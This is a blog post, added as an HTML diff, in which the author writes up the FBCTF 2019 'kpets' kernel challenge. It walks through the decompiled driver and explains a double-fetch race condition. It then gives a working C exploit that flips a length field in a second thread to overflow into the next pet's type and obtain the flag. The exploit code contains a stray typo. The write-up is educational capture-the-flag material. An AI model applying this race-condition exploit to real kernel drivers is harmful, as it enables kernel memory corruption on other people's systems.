@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en-id">
+    <head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<title>A Long Rant and FBCTF 2019 - kpets &middot; Kyra&#39;s Note</title>
+
+		
+  		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+		
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="Kyra&#39;s Note" />
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					<h2 class="nav-title">Kyra&#39;s Note</h2>
+				</a>
+				<ul>
+    <li><a href="/about">About</a></li>
+    <li><a href="/">Posts</a></li>
+</ul>
+			</div>
+		</nav>
+
+        
+
+<main>
+	<div class="post">
+		<div class="post-info">
+    <span>Written by</span>
+        circleous
+        <br>
+        <span>on&nbsp;</span><time datetime="2019-06-29 11:52:07 &#43;0700 WIB">June 29, 2019</time>
+</div>
+		<h1 class="post-title">A Long Rant and FBCTF 2019 - kpets</h1>
+<div class="post-line"></div>
+
+		
+
+		
+
+<h2 id="rant">rant</h2>
+
+<p>After reading auxy blog about <a href="http://www.auxy.xyz/tutorial/2019/06/10/Linux-Exp-Tutorial.html">linux kernel exploitation tutorial</a>, I kinda wanted to write this into a blog post. I&rsquo;m still rather new to kernel pwn, I&rsquo;ve been learning this since there is two kernel pwn appearances in secfest CTF around May 2019 <code>xtore</code> and <code>brainfuck64</code>. Reason? I need something beside learning classical heap pwn and might be a good mood booster to do another large codebase code review.</p>
+
+<p><code>brainfuck64</code> seems like a classic heap challenge, but in kernelspace. I didn&rsquo;t solve it tho, I literally just started this kernel pwn journey and didn&rsquo;t even know what&rsquo;s this <code>IOCTL</code> thing. Shortly, after ctf ends, I read <a href="https://kileak.github.io/ctf/2019/secfest-brainfuck64/">kileak writeup</a>, seems like my assumption is correct.</p>
+
+<p><code>xtore</code>, this is actually a blatant copy from <a href="https://www.root-me.org/en/Challenges/App-System/LinKern-ARM-Stack-Overflow">one of Root-Me.org kernel challenge</a> (I haven&rsquo;t solved this one at that time). Reversing the kernel module actually doesn&rsquo;t give you many attack surface, not even race or overflow exists&trade; or is it(?). The flaw actually is in this recursive function where it copy a chunk user buffer to kernel stack at a time, when the buffer given larger than the chunk, it calls itself to continue copy the chunk from last chunk position and continue to call recursively until all buffer copied. This is fine as it sounds, but the kernel stack actually doesn&rsquo;t have many room, only 8KB (2 memory pages), this could be a problem when a function uses too much stack memory or called <strong>recursively</strong>. This attack actually called <code>stack overflow</code>, where stack could grow to top address and over run thread_info. Writeup from teammate at OpenToAll, vakkz devcraft.io, <a href="https://devcraft.io/2019/05/28/xtore-security-fest-2019.html">xtore - Security Fest 2019</a>. Some light reading about this <code>Stack Overflow</code>, <a href="http://phrack.org/issues/64/6.html#article">phrack64 - Attacking the Core: Kernel Exploitation Notes</a> and <a href="https://jon.oberheide.org/files/infiltrate12-thestackisback.pdf">Jon Oberheide - The Stack is Back</a>.</p>
+
+<p>I&rsquo;m playing with PDKT in FBCTF 2019, which has 1 challenge rhyme with my current learning curve, kpets, an easy-medium kernel challenge which I didn&rsquo;t solve in time, TL;DR It&rsquo;s a double-fetch where we could create race condition and make kernel copy more buffer than allocated. More detailed writeup continued below, where I&rsquo;ll explain some failed attack ideas and dumb assumption where lead me into not solving this in time.</p>
+
+<h2 id="desc">desc</h2>
+
+<pre><code>We wrote a pet store application that was too slow, so we made a kernel module for it instead.
+
+nc 134.209.40.42 1337
+
+(Note: connecting to the problem mentions something about spectre. That's not the intended solution, but whatever works for you. Also when connecting to remote you can provide a URL to a VALID ELF FILE which will be downloaded and placed into the QEMU image to save you copying base64. This binary MUST BE an ELF and &lt; 1MB
+
+Author: pippinthedog
+</code></pre>
+
+<blockquote>
+<p>resource:
+<a href="https://github.com/fbsamples/fbctf-2019-challenges/tree/master/pwnables/kpets">kpets</a></p>
+</blockquote>
+
+<h2 id="rev">rev</h2>
+
+<p>From reversing the kernel module we could know that it creates device at <code>/dev/kpets</code>. As the desc implies, this is &ldquo;a pet store&rdquo; that live in
+kernel space and this <code>/dev/kpets</code> is an interface to the pet store. Also, from reversing this, there&rsquo;s an important struct which will be used in this interface.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> kpets {
+  <span style="color:#66d9ef">int</span> type;
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> name_len;
+  <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x20</span>];
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> desc_len;
+  <span style="color:#66d9ef">char</span> desc[<span style="color:#ae81ff">0x40</span>];
+};</code></pre></div>
+
+<h3 id="get-the-flag">get the flag</h3>
+
+<p>To get the flag, we need to create a <code>kpets</code> with <code>kpets-&gt;type == '\xAA'</code> and read <code>/dev/kpets</code> to get flag buffer.</p>
+
+<h3 id="create-kpet">create kpet</h3>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">dev_write</span>(<span style="color:#66d9ef">__int64</span> a1, kpets <span style="color:#f92672">*</span>kpets_from_user, <span style="color:#66d9ef">__int64</span> a3)
+{
+  <span style="color:#66d9ef">int</span> id; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  kpets <span style="color:#f92672">*</span>kpets_id_ptr; <span style="color:#75715e">// rbx
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// r14
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// rdi
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// [rsp+0h] [rbp-40h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> type; <span style="color:#75715e">// [rsp+Bh] [rbp-35h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> kpets_from_user_name_len; <span style="color:#75715e">// [rsp+Ch] [rbp-34h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> kpets_from_user_desc_len; <span style="color:#75715e">// [rsp+10h] [rbp-30h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> kpets_from_user_name_len_2; <span style="color:#75715e">// [rsp+14h] [rbp-2Ch]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v13; <span style="color:#75715e">// [rsp+18h] [rbp-28h]
+</span><span style="color:#75715e"></span>
+  v8 <span style="color:#f92672">=</span> a3;
+  copy_from_user(<span style="color:#f92672">&amp;</span>kpets_from_user_name_len, <span style="color:#f92672">&amp;</span>kpets_from_user<span style="color:#f92672">-&gt;</span>name_len, <span style="color:#ae81ff">4LL</span>);
+  <span style="color:#66d9ef">if</span> ( kpets_from_user_name_len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x20</span> )
+  {
+    printk(<span style="color:#e6db74">&#34;kpets: invalid pet name len: 0x%02x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> v8;
+  }
+  copy_from_user(<span style="color:#f92672">&amp;</span>kpets_from_user_desc_len, <span style="color:#f92672">&amp;</span>kpets_from_user<span style="color:#f92672">-&gt;</span>desc_len, <span style="color:#ae81ff">4LL</span>);
+  <span style="color:#66d9ef">if</span> ( kpets_from_user_desc_len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x40</span> )
+  {
+    printk(<span style="color:#e6db74">&#34;kpets: invalid pet description len: 0x%02x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> v8;
+  }
+
+  <span style="color:#75715e">// maybe find first empty slot??
+</span><span style="color:#75715e"></span>  id <span style="color:#f92672">=</span> max_pets <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)max_pets <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> )
+  {
+    <span style="color:#66d9ef">if</span> ( (_DWORD)max_pets )
+    {
+      kpets_id_ptr <span style="color:#f92672">=</span> (kpets <span style="color:#f92672">*</span>)first_slot;
+      <span style="color:#66d9ef">goto</span> LABEL_9;
+    }
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    kpets_id_ptr <span style="color:#f92672">=</span> (kpets <span style="color:#f92672">*</span>)first_slot;
+    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>(_BYTE <span style="color:#f92672">*</span>)first_slot )
+      <span style="color:#66d9ef">goto</span> LABEL_9;
+    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+    {
+      <span style="color:#f92672">--</span>id;
+      <span style="color:#f92672">--</span>kpets_id_ptr;
+      <span style="color:#66d9ef">if</span> ( id <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+        <span style="color:#66d9ef">break</span>;
+      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>LOBYTE(kpets_id_ptr<span style="color:#f92672">-&gt;</span>type) )
+        <span style="color:#66d9ef">goto</span> LABEL_9;
+    }
+  }                            
+  kpets_id_ptr <span style="color:#f92672">=</span> (kpets <span style="color:#f92672">*</span>)first_slot;
+  memset(chunk, <span style="color:#ae81ff">0</span>, chunk_size);
+
+  <span style="color:#75715e">// IDK
+</span><span style="color:#75715e"></span>LABEL_9:
+  v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>kpets_from_user_name_len_2;
+  kpets_from_user_name_len_2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">do</span>
+  {
+    v6 <span style="color:#f92672">=</span> v5<span style="color:#f92672">++</span>;
+    get_random_bytes(v6, <span style="color:#ae81ff">1LL</span>);
+    msleep(<span style="color:#ae81ff">1LL</span>);
+  }
+  <span style="color:#66d9ef">while</span> ( v5 <span style="color:#f92672">!=</span> <span style="color:#f92672">&amp;</span>v13 );
+
+  printk(<span style="color:#e6db74">&#34;kpets: your new pet owner is %s!&#34;</span>);
+
+  copy_from_user(<span style="color:#f92672">&amp;</span>type, kpets_from_user, <span style="color:#ae81ff">1LL</span>);
+  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)(type <span style="color:#f92672">+</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1u</span> <span style="color:#f92672">&amp;&amp;</span> type <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xC2u</span> ) <span style="color:#75715e">// Check for valid type
+</span><span style="color:#75715e"></span>  {
+    printk(<span style="color:#e6db74">&#34;kpets: invalid pet type: 0x%02hhx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    copy_from_user(<span style="color:#f92672">&amp;</span>kpets_from_user_name_len_2, <span style="color:#f92672">&amp;</span>kpets_from_user<span style="color:#f92672">-&gt;</span>name_len, <span style="color:#ae81ff">4LL</span>);<span style="color:#75715e">// second fetch!!!
+</span><span style="color:#75715e"></span>    LOBYTE(kpets_id_ptr<span style="color:#f92672">-&gt;</span>type) <span style="color:#f92672">=</span> type;
+    copy_from_user(kpets_id_ptr<span style="color:#f92672">-&gt;</span>name, kpets_from_user<span style="color:#f92672">-&gt;</span>name, kpets_from_user_name_len_2);
+    copy_from_user(kpets_id_ptr<span style="color:#f92672">-&gt;</span>desc, kpets_from_user<span style="color:#f92672">-&gt;</span>desc, kpets_from_user_desc_len);
+  }
+  <span style="color:#66d9ef">return</span> v8;
+}</code></pre></div>
+
+<p>To create <code>kpet</code>, we could write a <code>kpets</code> struct to <code>/dev/kpets</code>. There&rsquo;s some check in place,
+1. <code>kpet-&gt;name_len &lt; 32</code>
+2. <code>kpet-&gt;desc_len &lt; 64</code>
+3. <code>kpet-&gt;type</code> must be a valid type <code>'\xC0'</code> - <code>'\xC2'</code></p>
+
+<h3 id="read-kpets">read kpets</h3>
+
+<p>To read kpets, we could read <code>/dev/kpets</code> and see output from <code>dmesg</code> since the output is printed with <code>printk</code>.</p>
+
+<h2 id="attacc">attacc</h2>
+
+<p>The vulnerability is in <code>dev_write</code>, where it tries to fetch 2 times at a user buffer (hence the double fetch).
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:block;width:100%;background-color:#3c3d38">  copy_from_user(<span style="color:#f92672">&amp;</span>kpets_from_user_name_len, <span style="color:#f92672">&amp;</span>kpets_from_user<span style="color:#f92672">-&gt;</span>name_len, <span style="color:#ae81ff">4LL</span>);
+</span>  <span style="color:#66d9ef">if</span> ( kpets_from_user_name_len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x20</span> ) {
+    <span style="color:#75715e">// die
+</span><span style="color:#75715e"></span>  }
+  ...
+<span style="display:block;width:100%;background-color:#3c3d38">  copy_from_user(<span style="color:#f92672">&amp;</span>kpets_from_user_name_len_2, <span style="color:#f92672">&amp;</span>kpets_from_user<span style="color:#f92672">-&gt;</span>name_len, <span style="color:#ae81ff">4LL</span>); <span style="color:#75715e">// second fetch!!!
+</span></span><span style="color:#75715e"></span>  copy_from_user(kpets_id_ptr<span style="color:#f92672">-&gt;</span>name, kpets_from_user<span style="color:#f92672">-&gt;</span>name, kpets_from_user_name_len_2);</code></pre></td></tr></table>
+</div>
+</div></p>
+
+<p>To exploit this we could use race condition to create change <code>kpets-&gt;name_len</code> just enough to bypass the first check and overflow the buffer. Remember that we only need to create the <code>kpet-&gt;type == '\xAA'</code> to get the flag? we could just overwrite the next <code>kpet-&gt;type</code> to <code>0xAA</code> using overflow on current <code>kpet-&gt;name</code> buffer.</p>
+
+<h2 id="exploit">exploit</h2>
+
+<p>Rather than explaining the exploit method, here a commented source code.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define _GNU_SOURCE
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define KDOG   0xC0
+</span><span style="color:#75715e">#define KCAT   0xC1
+</span><span style="color:#75715e">#define KSHEEP 0xC2
+</span><span style="color:#75715e">#define KFLAG  0xAA
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> kpets {
+  <span style="color:#66d9ef">int</span> type;
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> name_len;
+  <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x20</span>];
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> desc_len;
+  <span style="color:#66d9ef">char</span> desc[<span style="color:#ae81ff">0x41</span>]; <span style="color:#75715e">// overwrite next-&gt;type
+</span><span style="color:#75715e"></span>} kpets;
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> fd;
+<span style="color:#66d9ef">static</span> kpets<span style="color:#f92672">*</span> pet;
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">evil_thread</span>()
+{
+  <span style="color:#75715e">/*
+</span><span style="color:#75715e">   * This will change the name_len between 0 and 0x65 forever, 
+</span><span style="color:#75715e">   * current-&gt;name[0x20] + current-&gt;desc_len[0x4] +
+</span><span style="color:#75715e">   * current-&gt;desc[0x40] + next-&gt;type[0x1] == 0x65, and hope
+</span><span style="color:#75715e">   * that 0 will hit the first length check and 0x65 when hit
+</span><span style="color:#75715e">   * the second fetch and surely overwrite our next kpet-&gt;type
+</span><span style="color:#75715e">   */</span>
+  <span style="color:#66d9ef">for</span>(;;) pet<span style="color:#f92672">-&gt;</span>name_len <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x65</span>;
+  <span style="color:#66d9ef">return</span> NULL;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>argv[]) {
+  pthread_t pth1;
+  kpets kpet;
+
+  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">256</span>];
+  memset(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+
+  fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/kpets&#34;</span>, O_RDWR);
+  pet <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>kpet;
+  memset(pet, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(kpets));
+
+  pet<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> KDOG;
+  pet<span style="color:#f92672">-&gt;</span>name_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  pet<span style="color:#f92672">-&gt;</span>desc_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  pet<span style="color:#f92672">-&gt;</span>desc[<span style="color:#ae81ff">0x40</span>] <span style="color:#f92672">=</span> KFLAG;
+
+  <span style="color:#75715e">// Run a separate thread to race
+</span><span style="color:#75715e"></span>  pthread_create(<span style="color:#f92672">&amp;</span>pth1, NULL, evil_thread, NULL);
+
+  write(fd, pet, <span style="color:#ae81ff">0x6C</span>);
+
+  <span style="color:#66d9ef">for</span> (;;) {
+    write(fd, pet, <span style="color:#ae81ff">0x6C</span>);
+    read(fd, buf, <span style="color:#66d9ef">sizeof</span>(buf));
+    <span style="color:#75715e">// If there&#39;s a non-null bytes in our buffer from
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// our read, it means we succeed to get the flag
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>]) { 
+      write(<span style="color:#ae81ff">1</span>, buf, <span style="color:#66d9ef">sizeof</span>(buf));we
+      <span style="color:#66d9ef">break</span>;
+    }
+  }
+
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div></p>
+
+<p>Runinng this on server, we immediately get the flag,</p>
+
+<pre><code>fb{lets_try_that_again__double_the_fetch_for_double_the_fun}
+</code></pre>
+
+<h2 id="failed-attack-ideas">failed attack ideas</h2>
+
+<p>slow branch condition
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  <span style="color:#66d9ef">for</span>(;;) pet<span style="color:#f92672">-&gt;</span>name_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x64</span> <span style="color:#f92672">+</span> (rand() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>);</code></pre></div></p>
+
+<p>notice that I&rsquo;m using XOR on name_len to create where it changes between 0 and 0x65, but here I thought just change the value using branch condition would succeed, but that&rsquo;s not gonna happen. I&rsquo;ve tried to change the <code>rand()</code> to a static random buffer read from &lsquo;/dev/urandom&rsquo; and that failed too. At this point, I thought maybe there&rsquo;s something todo with the qemu start script where it has <code>thread=1</code> option,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">qemu-system-x86_64 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -m 64M -smp <span style="color:#ae81ff">1</span>,cores<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>,threads<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    --enable-kvm <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -kernel $1 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -nographic <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -append <span style="color:#e6db74">&#34;console=ttyS0 noapic quiet&#34;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -initrd $2 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -monitor /dev/null -s</code></pre></div>
+thus, I started to find another attack surface for this since I thought race condition isn&rsquo;t an option here (and&hellip; well.. It fails miserably). sad.</p>
+
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/def-con-qual-2019-babyheap/" class="left arrow">&#8592;</a>
+		<a href="/cerita-di-balik-2-tahun-menjadi-ngadimin-hacktoday/" class="right arrow">&#8594;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			<span>
+			&copy; <time datetime="2019-08-25 12:08:18.068306465 &#43;0700 WIB m=&#43;0.122165669">2019</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
